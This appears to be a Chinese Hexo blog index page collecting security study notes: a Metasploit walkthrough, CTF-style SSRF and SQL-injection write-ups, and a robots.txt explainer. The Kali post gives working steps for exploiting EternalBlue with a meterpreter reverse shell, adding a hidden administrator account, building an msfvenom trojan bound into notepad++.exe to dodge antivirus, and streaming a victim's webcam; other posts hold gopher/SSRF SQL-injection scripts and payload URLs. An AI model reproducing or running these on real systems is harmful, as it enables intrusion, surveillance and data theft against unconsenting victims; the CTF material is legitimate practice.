<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />

    

    

    <title>Hexo</title>
    <meta name="author" content="John Doe" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />

    
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/logo.jpg">
    

    <style type="text/css">
    @font-face {
        font-family: 'icomoon';
        src: url("/fonts/icomoon.eot?q628ml");
        src: url("/fonts/icomoon.eot?q628ml#iefix") format('embedded-opentype'),
             url("/fonts/icomoon.ttf?q628ml") format('truetype'),
             url("/fonts/icomoon.woff?q628ml") format('woff'),
             url("/fonts/icomoon.svg?q628ml#icomoon") format('svg');
        font-weight: normal;
        font-style: normal;
    }
    </style>
    
<link rel="stylesheet" href="/css/style.css">


    <!--[if lt IE 9]><style type="text/css">.nav-inner {top:0;}.author-meta {position:static;top:0;}.search-form {height:36px;}</style><script type="text/javascript" src="https://unpkg.com/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
<meta name="generator" content="Hexo 6.3.0"></head>
<body>

    <main class="app">
        <header id="header" class="header clearfix">
    <div id="nav" class="nav">
    <div class="nav-mobile">
        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
        <h1 class="nav-mobile-title nav-mobile-item">Hexo</h1>
        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
    </div>

    <nav id="nav-inner" class="nav-inner">
        
            <a class="nav-item active" href="/">
                <span class="nav-text">首页</span>
            </a>
        
            <a class="nav-item" href="/categories/front-end">
                <span class="nav-text">前端</span>
            </a>
        
            <a class="nav-item" href="/categories/back-end">
                <span class="nav-text">后端</span>
            </a>
        
            <a class="nav-item" href="/tags">
                <span class="nav-text">标签</span>
            </a>
        
            <a class="nav-item" href="/archives">
                <span class="nav-text">归档</span>
            </a>
        
            <a class="nav-item" href="/atom.xml">
                <span class="nav-text">订阅</span>
            </a>
        
            <a class="nav-item" href="/about">
                <span class="nav-text">关于</span>
            </a>
        
    </nav>
</div>

    <aside id="aside" class="aside">
    <div id="aside-mask" class="aside-mask"></div>
    <div id="aside-inner" class="aside-inner">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://example.com"></form>

        
        

        
        <div class="author-meta">
            
            <div class="author-avatar">
                <a href="/">
                    <img src="/img/logo.jpg" title="Sanonz">
                </a>
            </div>
            
            <div class="author-name">Sanonz</div>
            <div class="author-work">Web Developer &amp; Designer</div>
            <div class="author-location">
                <i class="icon-location vm"></i>
                <span class="vm">Shenzhen, China</span>
            </div>
            
            <div class="author-thread-wrap">
                <div class="author-threads clearfix">
                    
                        <a class="thread-item" href="https://github.com/sanonz" target="_blank" rel="noopener">
                            <!-- Generated by IcoMoon.io -->
<svg viewBox="0 0 1024 1024" width="38" height="38" fill="currentColor">
<path d="M512 32.12c-265.004 0-479.88 220.23-479.88 492.090 0 217.446 137.536 401.684 328.202 466.81 23.994 4.498 32.778-10.712 32.778-23.78 0-11.782-0.428-42.632-0.642-83.764-133.466 29.778-161.744-65.984-161.744-65.984-21.852-56.772-53.344-71.982-53.344-71.982-43.49-30.636 3.214-29.992 3.214-29.992 48.202 3.428 73.482 50.772 73.482 50.772 42.846 75.196 112.258 53.558 139.68 40.918 4.284-31.706 16.71-53.558 30.42-65.77-106.474-12.426-218.516-54.63-218.516-243.152 0-53.772 18.638-97.69 49.274-131.966-4.928-12.426-21.424-62.556 4.714-130.252 0 0 40.276-13.282 131.966 50.344 38.348-10.926 79.266-16.282 120.184-16.496 40.704 0.214 81.836 5.57 120.184 16.496 91.692-63.626 131.752-50.344 131.752-50.344 26.136 67.698 9.64 117.828 4.714 130.252 30.636 34.492 49.274 78.408 49.274 131.966 0 188.952-112.258 230.514-219.16 242.724 17.138 15.21 32.564 45.202 32.564 91.048 0 65.77-0.642 118.898-0.642 134.966 0 13.068 8.57 28.492 32.992 23.566 191.094-64.912 328.418-249.152 328.418-466.382 0-271.86-214.874-492.090-479.88-492.090z"></path>
</svg>

                        </a>
                    
                </div>
            </div>
            
        </div>
        
    </div>
</aside>

</header>

        <div id="content" class="content">
            <div id="wrapper" class="wrapper" style="max-width: 800px">
                
    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/07/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-07-21T01:59:32.000Z" itemprop="datePublished">2023-07-21</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        
        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/07/20/%E4%BD%93%E9%AA%8Ckali%E6%B8%97%E9%80%8F/">体验kali渗透</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-07-20T10:19:59.000Z" itemprop="datePublished">2023-07-20</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <h1 id="体验kali渗透工具"><a href="#体验kali渗透工具" class="headerlink" title="体验kali渗透工具"></a>体验kali渗透工具</h1><ol>
<li>metasploit 攻击 windows 操作系统<br>启动metasploit前需要做：</li>
</ol>
<ul>
<li>打开kali终端</li>
<li>使用sudo su命令，并输入kali的密码kali，切换至root用户</li>
<li>使用msfdb init命令 初始化metasploit数据库（*可选）</li>
</ul>
<h2 id="永恒之蓝漏洞："><a href="#永恒之蓝漏洞：" class="headerlink" title="永恒之蓝漏洞："></a>永恒之蓝漏洞：</h2><p>metasploit攻击永恒之蓝全流程：</p>
<ol>
<li>使用模块<br>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</li>
<li>设置必选项<br>查看必选项[*required 为 yes的就是必选项]<br>show options<br>set RHOSTS 192.168.1.128<br>[*RHOSTS为target host(s)代表你要攻击谁]</li>
</ol>
<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>[*payload是攻击载荷，就是攻击完成后想干啥，这里是想获取meterpreter]<br>[*meterpreter是meteasploit后渗透的神器]</p>
<p>set LHOSTS 192.168.1.136<br>[*LHOSTS为listen host 代表你是谁，既kali的ip地址]</p>
<p>set LPORT 12345<br>[*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用]</p>
<ol start="3">
<li>运行模块，完成攻击<br>run</li>
</ol>
<h3 id="攻击成功后能做什么"><a href="#攻击成功后能做什么" class="headerlink" title="攻击成功后能做什么"></a>攻击成功后能做什么</h3><p>meterpreter是强大的后渗透模块，可以输入help查看帮助信息</p>
<p>远程控制、命令执行、摄像头监控、密码获取、创建后门用户、破坏篡改系统…</p>
<p>例：创建后门用户并开启远程连接<br>shell<br>net user zhangsan 123456&#x2F;add &amp;&amp; net localgroup administrators zhangsan &#x2F;add exit<br>run getgui-e</p>
<h4 id="使用kali渗透工具生成远控木马"><a href="#使用kali渗透工具生成远控木马" class="headerlink" title="使用kali渗透工具生成远控木马"></a>使用kali渗透工具生成远控木马</h4><p>msfvenom是用来生成后门的软件，在目标上执行后门，在本地上监听上线。<br>[*msfvenom在shell里使用，不是msfconsole终端]</p>
<p>Windows可执行程序后门：<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;revers_tcp host&#x3D;192.168.123.136 lport&#x3D;9999 -f exe -o demo.exe</p>
<p>-p：payload   -f：formant  exe：Windows可执行文件  -o：output</p>
<p>生成木马在msfconsole里开启监听，等待受害者上钩<br>use exploit&#x2F;mutil&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterprter&#x2F;reverse_tcp<br>set lhost 192.168.123.163<br>set lport 9999<br>run<br>参数要一致</p>
<h5 id="免杀躲避火绒的探测"><a href="#免杀躲避火绒的探测" class="headerlink" title="免杀躲避火绒的探测"></a>免杀躲避火绒的探测</h5><ol>
<li>最基础的免杀[*对于其他杀毒软件效果不同，具体情况请自行尝试]<br>捆绑木马<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.136 lport&#x3D;9999 -f exe -x notepad+ +.exe -o notepad+ +.exe</li>
</ol>
<p>加壳：压缩壳、加密壳</p>
<p>例：打开摄像头<br>meterpreter&gt; webcam_stream<br>Starting…<br>Preparing player…<br>Opening player at: &#x2F;home&#x2F;kali&#x2F;nprnAywg.html<br>Streaming…</p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/07/20/%E6%9F%A5%E8%A1%A8/">查表</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-07-20T10:15:07.000Z" itemprop="datePublished">2023-07-20</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #</p>
<p>python脚本：</p>
<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
<p>“””.format(host,cookie)</p>
<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSkgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyBXSEVSRSB0YWJsZV9uYW1lPSdmbGFnJyksMHg3ZSkpICM%253D%250D%250A%250D%250A</a></p>
<p>可以看到flag表中只有一个flag列</p>
<p>查内容<br>admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #<br>python脚本</p>
<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
<p>“””.format(host,cookie)</p>
<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoU0VMRUNUIGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A</a></p>
<p>此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取：</p>
<p>分割读取<br>admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #<br>python脚本:</p>
<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
<p>“””.format(host,cookie)</p>
<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
<p>payload:<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A</a></p>
<p>两次的结果一合并，获得flag<br>————————————————<br>版权声明：本文为CSDN博主「sean7777777」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128069145">https://blog.csdn.net/yuanxu8877/article/details/128069145</a></p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/07/19/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-07-19T08:36:06.000Z" itemprop="datePublished">2023-07-19</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <p>通过报错信息，可以找到闭合点为admin’) #,但是很明显，此处有报错信息，直接使用报错注入。<br>payload为admin’) and extractvalue(1, concat(0x7e, (select @@version),0x7e)) # 检查是否可以进行报错注入<br>运用python脚本转换为gopher协议</p>
<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (select @@version),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
<p>“””.format(host,cookie)</p>
<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
<p>获得payload如下</p>
<p>gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_GET%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEBAdmVyc2lvbiksMHg3ZSkpICM%253D%250D%250A%250D%250A<br>1</p>
<p>如图可以看到，数据库信息被回显出来了，所以报错信息可以使用，接下来就是查库，查表、查列了。<br>查数据库：</p>
<p>查数据库<br>查数据库：admin’) and extractvalue(1, concat(0x7e, (select database()),0x7e)) #<br>python脚本如下</p>
<p>import urllib.parse<br>import base64<br>host &#x3D; “127.0.0.1:80”<br>payload &#x3D; “admin’) and extractvalue(1, concat(0x7e, (select database()),0x7e)) #”<br>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)<br>cookie&#x3D;”this_is_your_cookie&#x3D;”+base64_payload</p>
<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
<p>“””.format(host,cookie)</p>
<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
<p>url：<a target="_blank" rel="noopener" href="http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj%250D%250A%250D%250A">http://61.147.171.105:57270/use.php?url=gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpKSAj%250D%250A%250D%250A</a></p>
<p>数据库为security</p>
<p>查表<br>查表：admin’) and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema&#x3D;’security’),0x7e)) #</p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/07/05/robots-txt%E6%96%87%E4%BB%B6/">robots.txt文件</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-07-05T08:14:30.000Z" itemprop="datePublished">2023-07-05</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <h1 id="一、robots-txt文件"><a href="#一、robots-txt文件" class="headerlink" title="一、robots.txt文件"></a>一、robots.txt文件</h1><ol>
<li><p>Robots.txt文件是网站跟爬虫间的协议，对于专业SEO并不陌生，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p>
</li>
<li><p>如您的网站未设置robots协议，搜索引擎对网站视频URL的收录将包含视频播放页URL，及页面中的视频文件、视频周边文本等信息，搜索对已收录的短视频资源将对用户呈现为视频极速体验页。此外，综艺影视类长视频，搜索引擎仅收录页面URL。</p>
</li>
</ol>
<hr>
<p><strong>User-agent:</strong><br>该项的值用于描述搜索引擎robot的名字，在”robots.txt”文件中，如果有多条User-agent记录说明有多个robot会受到该协议的限制，对该文件来说，至少要有一条User-agent记录。如果该项的值设为*，则该协议对任何机器人均有效，在”robots.txt”文件中，”User-agent:*”这样的记录只能有一条。<br><strong>Disallow:</strong><br>该项的值用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被robot访问到。例如”Disallow:&#x2F;help”对&#x2F;help.html 和&#x2F;help&#x2F;index.html都不允许搜索引擎访问，而”Disallow:&#x2F;help&#x2F;”则允许robot访问&#x2F;help.html，而不能访问&#x2F;help&#x2F;index.html。任何一条Disallow记录为空，说明该网站的所有部分都允许被访问，在”&#x2F;robots.txt”文件中，至少要有一条Disallow记录。如果”&#x2F;robots.txt”是一个空文件，则对于所有的搜索引擎robot，该网站都是开放的。<br><strong>Allow:</strong><br>该项的值用于描述希望被访问的一组URL，与Disallow项相似，这个值可以是一条完整的路径，也可以是路径的前缀，以Allow项的值开头的URL是允许robot访问的。例如”Allow:&#x2F;hibaidu”允许robot访问&#x2F;hibaidu.htm、&#x2F;hibaiducom.html、&#x2F;hibaidu&#x2F;com.html。一个网站的所有URL默认是Allow的，所以Allow通常与Disallow搭配使用，实现允许访问一部分网页同时禁止访问其它所有URL的功能。<br>需要特别注意的是Disallow与Allow行的顺序是有意义的，robot会根据第一个匹配成功的Allow或Disallow行确定是否访问某个URL。</p>
<p><em>使用”</em>”和”$”：*<br>robots支持使用通配符”<em>”和”$”来模糊匹配url：<br>“$” 匹配行结束符。<br>“</em>” 匹配0或多个任意字符。</p>
<h2 id="二、Robots-txt文件的写法"><a href="#二、Robots-txt文件的写法" class="headerlink" title="二、Robots.txt文件的写法"></a>二、Robots.txt文件的写法</h2><ul>
<li>User-agent: *   (头部标准)</li>
<li>Allow: &#x2F;        （允许全部搜索引擎捉取）</li>
<li>User-agent: Googlebot (谷歌蜘蛛)</li>
<li>Disallow:       （默认捉取）</li>
<li>User-agent: Baiduspider (百度蜘蛛)</li>
<li>Disallow: &#x2F;      （禁止捉取）</li>
<li>Sitemap: <a target="_blank" rel="noopener" href="https://www.l.cn/sitemap.xml">https://www.l.cn/sitemap.xml</a>  （站点地图）</li>
</ul>
<h3 id="三、在线生成Robots-txt-文件"><a href="#三、在线生成Robots-txt-文件" class="headerlink" title="三、在线生成Robots.txt 文件"></a>三、在线生成Robots.txt 文件</h3><p>站长工具Robots.txt生成：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/robots/">http://tool.chinaz.com/robots/</a><br>便民查询网Robots.txt生成器：<a target="_blank" rel="noopener" href="https://robots.51240.com/">https://robots.51240.com/</a><br>Tool在线工具：<a target="_blank" rel="noopener" href="https://www.qtool.net/robots">https://www.qtool.net/robots</a></p>
<h4 id="四、Robots-txt在线检测工具"><a href="#四、Robots-txt在线检测工具" class="headerlink" title="四、Robots.txt在线检测工具"></a>四、Robots.txt在线检测工具</h4><p>当写好robots.txt文件就需要检测是否有写，下面提供几款在线工具帮助大家检测robots是否有写错。</p>
<p>爱站Robots.txt检测工具：<a target="_blank" rel="noopener" href="https://tools.aizhan.com/robots/">https://tools.aizhan.com/robots/</a></p>
<p>站长工具Robots.txt检测：<a target="_blank" rel="noopener" href="http://s.tool.chinaz.com/robots/">http://s.tool.chinaz.com/robots/</a></p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/07/01/gopher%E5%8D%8F%E8%AE%AE/">gopher协议</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-07-01T12:52:25.000Z" itemprop="datePublished">2023-07-01</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
        <h1 id="编写payload脚本，实现内部访问："><a href="#编写payload脚本，实现内部访问：" class="headerlink" title="编写payload脚本，实现内部访问："></a>编写payload脚本，实现内部访问：</h1><p><em>import urllib.parse</em></p>
<p>host &#x3D; “127.0.0.1:80”<br>content &#x3D; “uname&#x3D;admin&amp;passwd&#x3D;admin”<br>content_length &#x3D; len(content)</p>
<p>test &#x3D;<br>“””POST &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>User-Agent: curl&#x2F;7.43.0<br>Accept: <em>&#x2F;</em><br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: {}</p>
<p>{}<br>“””.format(host,content_length,content)<br>&#x2F;&#x2F;按照标准，URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。<br>因为我在构造URL的过程中要使用到中文：此时需要用到urllib.parse.quote，此处是为了替换特殊字符<br>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>
<h2 id="这个脚本的意思就是构造一个数据包，用gopher协议发送"><a href="#这个脚本的意思就是构造一个数据包，用gopher协议发送" class="headerlink" title="这个脚本的意思就是构造一个数据包，用gopher协议发送"></a>这个脚本的意思就是构造一个数据包，用gopher协议发送</h2><p>运行脚本获得payload如下：gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520&#x2F;index.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl&#x2F;7.43.0%250D%250AAccept%253A%2520%252A&#x2F;%252A%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</p>
<h3 id="抓包获取"><a href="#抓包获取" class="headerlink" title="抓包获取"></a>抓包获取</h3><ol>
<li>可以发现setcookie的值为admin的base64编码值。</li>
</ol>
<p>猜测在setcookie处为注入点，首先测试是字符型还是整数型注入，构造payload为admin’ #<br>构造脚本</p>
<p>import urllib.parse</p>
<p>host &#x3D; “127.0.0.1:80”<br>cookie&#x3D;”this_is_your_cookie&#x3D;YWRtaW4nICM&#x3D;”</p>
<p>test &#x3D;<br>“””GET &#x2F;index.php HTTP&#x2F;1.1<br>Host: {}<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Cookie:{}</p>
<p>“””.format(host,cookie)</p>
<p>tmp &#x3D; urllib.parse.quote(test)<br>new &#x3D; tmp.replace(“%0A”,”%0D%0A”)<br>result &#x3D; urllib.parse.quote(new)<br>print(“gopher:&#x2F;&#x2F;“+host+”&#x2F;_”+result)</p>

        
    </section>
</article>


    <article class="article" itemscope itemprop="blogPost">
    
    <header class="article-header">
        
        <h1 itemprop="name">
            <a href="/2023/06/29/ssrf%E8%AF%A6%E8%A7%A3/">ssrf详解</a>
        </h1>
        
        <div class="article-meta clearfix">
            <a class="article-date" href="http://example.com/index.html">
    
    <i class="icon-calendar vm"></i>
    
    <time class="vm" datetime="2023-06-29T13:30:11.000Z" itemprop="datePublished">2023-06-29</time>
</a>

            

        </div>
    </header>
    
    <section class="article-body markdown-body">
        
